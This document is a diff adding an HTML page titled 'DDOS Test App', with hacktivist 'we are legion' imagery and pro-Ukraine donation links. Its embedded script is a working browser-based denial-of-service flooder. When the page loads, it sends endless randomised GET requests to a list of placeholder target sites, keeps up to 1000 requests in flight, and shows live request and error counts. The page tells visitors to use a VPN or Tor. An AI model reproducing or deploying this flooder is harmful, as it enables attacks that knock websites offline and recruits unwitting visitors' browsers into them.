@@ -1,0 +1,115 @@
+<head>
+<style type="text/css" media="screen">
+  #t1 tr:nth-child(odd) {background-color: #FAFFA5;}
+  #t1 tr:nth-child(even) {background-color: lightgray;}
+</style>
+  <meta charset="utf-8" />
+  <title>DDOS Test App</title>
+</head>
+<table border="0" align="center" ; width: 100%;" border="1">
+<tbody>
+<tr>
+<td style="width: 50%;">
+<pre><img src="https://duckduckgo.com/i/99f9773c.png" alt="we are legion" /></pre>
+</td>
+<td style="width: 50%;">
+
+<h1>ДиоиЎмоцѕ</h1>
+</td>
+</tr>
+</tbody>
+</table>
+ <body style="background-color:#0057B7;">
+
+<body>
+
+  <table width="100%">
+    <tr>
+      <td width="100%">
+        <center><h4><span style="background-color: darkred; color: #ffffff;">Please open this page using a VPN and you can also drag and drop into TorBrowser.</span></h4></center>
+<p style="text-align: center;"><span style="background-color: #FAFFA5; color: #000000;"><a href="https://www.torproject.org/">https://www.torproject.org</a>&nbsp; &nbsp;|&nbsp; &nbsp; <a href="https://protonvpn.com">https://protonvpn.com</a></span></p>
+<p style="text-align: center;"><span style="background-color: #ccffcc;  color: #000000;">💸<a title="UNDER FIRE" href="https://vostok-sos.org/en/ukraine-under-fire-support-vostok-sos-aid-operation/" target="_blank">Donate to the Ukraine Under Fire Here💸</a></span></p>
+<p style="text-align: center;">&nbsp;</p>
+      </td>
+
+   </table>
+   <div id="stats"></div>
+
+<script>
+var targets = [
+  'https://4.io/',
+  'https://3.net',
+  'https://2.org/',
+  'https://www.1.com/',
+,
+]
+
+
+var targetStats = {}
+targets.forEach((target) => {
+  targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
+})
+
+
+var statsEl = document.getElementById('stats');
+function printStats() {
+  statsEl.innerHTML = '<table id="t1" border="1" width="100%" align="left"><thead><tr><th align="left" bgcolor="white"> Website</th><th align="left" bgcolor="white">Dos Requests</th><th align="left" bgcolor="white">Errors</th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><th align="left" bgcolor="white">' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+}
+setInterval(printStats, 1000);
+
+var CONCURRENCY_LIMIT = 1000
+var queue = []
+
+async function fetchWithTimeout(resource, options) {
+  const controller = new AbortController();
+  const id = setTimeout(() => controller.abort(), options.timeout);
+  return fetch(resource, {
+    method: 'GET',
+    mode: 'no-cors',
+    signal: controller.signal
+  }).then((response) => {
+    clearTimeout(id);
+    return response;
+  }).catch((error) => {
+    clearTimeout(id);
+    throw error;
+  });
+}
+
+async function flood(target) {
+  for (var i = 0;; ++i) {
+    if (queue.length > CONCURRENCY_LIMIT) {
+      await queue.shift()
+    }
+    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+    queue.push(
+      fetchWithTimeout(target+rand, { timeout: 1000 })
+        .catch((error) => {
+          if (error.code === 20 /* ABORT */) {
+            return;
+          }
+          targetStats[target].number_of_errored_responses++;
+        })
+        .then((response) => {
+          if (response && !response.ok) {
+            targetStats[target].number_of_errored_responses++;
+          }
+          targetStats[target].number_of_requests++;
+        })
+
+    )
+  }
+}
+
+// Start
+targets.map(flood)
+</script>
+
+<table style="border-collapse: collapse; width: 100%; height: 18px;" border="0">
+<tbody>
+<tr style="height: 18px;">
+<td style="width: 100%; height: 18px; text-align: center;"><br />Support Ukranie | Слава Україні</td></tr>
+</tbody>
+</table>
+</body>
+    
